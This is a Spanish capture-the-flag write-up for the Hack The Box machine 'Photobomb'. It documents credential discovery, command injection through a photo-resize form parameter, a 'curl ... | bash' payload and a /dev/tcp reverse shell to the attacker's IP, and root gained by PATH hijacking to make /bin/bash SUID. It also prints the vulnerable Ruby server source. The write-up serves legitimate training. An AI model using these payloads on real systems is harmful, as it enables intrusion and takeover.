# 10.10.11.182 - Photobomb
--------------------------

Puertos abiertos 22(ssh), 80(http):

```console
└─$ whatweb photobomb.htb
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://photobomb.htb/FUZZ.php
000000477:   401        7 L      12 W       188 Ch      "printer"
000001215:   401        7 L      12 W       188 Ch      "printers"
000004283:   401        7 L      12 W       188 Ch      "printerfriendly"
000008546:   401        7 L      12 W       188 Ch      "printer_friendly"
000013484:   401        7 L      12 W       188 Ch      "printer_icon"
```
Si es busqueda de subdirectorios, archivos txt o lo que sea arroja los mismos resultados. Parece que hay algun 
tipo de regla que todo lo que empize por "printer" lo inluye saliendo el mismo resultado
En la busqueda de subdominios no conseguimos resultado.

Si inspeccionaos el codigo fuente encontramos la ruta "photobomb.js".
```console
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');}}
window.onload = init;
```
Conseguimos el usuario "Jameson" y "http://pH0t0:b0Mb!@photobomb.htb/printer" (usuario pH0t0 contraseña b0Mb!)
Te sale un sitio con fotografias para descargar.
```
/POST a photobomb.htb/printer
Authorization: Basic cEgwdDA6YjBNYiE=  ->  ("pH0t0:b0Mb!" en base64)
photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

La ruta de las fotografias está bajo *photobomb.htb/ui_images*. Si buscamos esto sale un codigo extraño:
```
Sinatra no se conoce esta cancioncilla
Try this:
[http://127.0.0.1:4567/__sinatra__/404.png]
get '/ui_images'; do
  "Hello World"
end
```
Sinatra es un framework escrito en ruby que utiliza regex para las rutas, por eso todo lo que sea printer*
sale con el mismo resultado.
Tanto [en](https://security.snyk.io/vuln/SNYK-RUBY-SINATRA-22017) como [en](https://sinatrarb.com/protection/path_traversal) 
encuentro que sinatra es vulnerable a path traversal urlencodeando los '/'(%2f) y los '.'(%2e)
```
http://photobomb.htb/ui_images%2f..%2f..%2f..etc/passwd -> bad request
http://photobomb.htb/ui_images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> /etc/passwd
http://photobomb.htb/ui_images/test -> /ui_images/test
http://photobomb.htb/ui_images/../../../../etc/passwd -> /etc/passwd
http://photobomb.htb/ui_images//....//....//....//etc/passwd -> /ui_images/..../..../..../etc/passwd 
http://photobomb.htb/ui_images//..//..//..//etc/passwd -> /ui_images/etc/passwd
```

Parece que está bien sanitizado. La parte de la descarga de imágenes...

```console
└─$ curl -s -X POST http://photobomb.htb/printer -H 'Authorization: Basic cEgwdDA6YjBNYiE=' \                    2-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000' -i
# 200 ok

-d 'photo=../../../../etc/passwd&filetype=jpg&dimensions=3000x2000'
# invalid photo

-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg;ping -c 1 10.10.14.3&filetype=jpg&dimensions=3000x200'
# Source photo does not exist.

-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x200;ping -c 1 10.10.14.3' 
# Invalid dimensions.

-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;test&dimensions=3000x2000'
# Failed to generate a copy of masaaki-komori-NYFaNoiPf7A-unsplash.jpg 


-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;ping -c 1 10.10.14.3&dimensions=3000x2000'
# sudo tcpdump icmp -n -i tun0  -> paquete recibido -> RCE

-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;curl http://10.10.14.3 | bash&dimensions=3000x200'
```
```bash
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/10.10.14.3/666 0>&1'
```
En el directorio por el que accedo encuentro:

```console
wizard@photobomb:~/photobomb$ cat photobomb.sh 
#!/bin/sh
cd $(dirname $(readlink -f "$0"))
ruby server.rb >>log/photobomb.log 2>&1
```
Como bien he leido bajo el puerto 4567 corre ruby
```
tcp        0      0 127.0.0.1:4567          0.0.0.0:*               LISTEN      769/ruby
```

En /opt existe el script cleanup.sh, cuyo propietario es root y que supongo que corre a intervalos de tiempo 
regulares

```bash
#!/bin/bash
cd /home/wizard/photobomb

# Limpiar los archivos
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# Asigna privilegios de root a todas las fotos
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
Si subimos el procmon.sh al rato detecta el proceso:
Como el find se hace por ruta relativa se puede hacer un secuestro de PATH

```
> /bin/sh -c sudo /opt/cleanup.sh
> sudo /opt/cleanup.sh
> /bin/bash /opt/cleanup.sh
> find source_images -type f -name *.jpg -exec chown root:root {} ;
```

```console
wizard@photobomb:~/photobomb$ echo '#!/bin/sh' > /tmp/find 
wizard@photobomb:~/photobomb$ echo 'chmod u+s /bin/bash' >> /tmp/find
wizard@photobomb:~/photobomb$ chmod +x /tmp/find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:/tmp$ bash -p
bash-5.0# whoami
root
```

```
# server.rb
require 'sinatra'
set :public_folder, 'public'

# ---- Codigo de la ruta raiz (/) -- # 
get '/' do
  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
HTML
  content_type :html
  return html
end

# ---- Codigo de la ruta printer ( GET /printer) -- #
get '/printer' do
  images = ''
  checked = ' checked="checked" '
  Dir.glob('public/ui_images/*.jpg') do |jpg_filename|
    img_src = jpg_filename.sub('public/', '')
    img_name = jpg_filename.sub('public/ui_images/', '')
    images += '<input type="radio" name="photo" value="' + img_name + '" id="' + img_name + '"' + checked + '
/><label for="' + img_name + '" style="background-image: url(' + img_src + ')"></label>'
    checked = ''
  end

  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
      #{images}
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
HTML

  content_type :html
  return html
end

# ---- Codigo de la ruta printer ( POST /printer) -- #

post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)  halt 500, 'Invalid photo.' end
  if !FileTest.exist?( "source_images/" + photo ) halt 500, 'Source photo does not exist.' end
  if !filetype.match(/^(png|jpg)/) halt 500, 'Invalid filetype.' end
  if !dimensions.match(/^[0-9]+x[0-9]+$/) halt 500, 'Invalid dimensions.' end

  case filetype
	 when 'png'  content_type 'image/png'
 	 when 'jpg'  content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else puts "File already exists."
  end

  if File.exists?('resized_images/' + filename) halt 200, {}, IO.read('resized_images/' + filename) end
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```
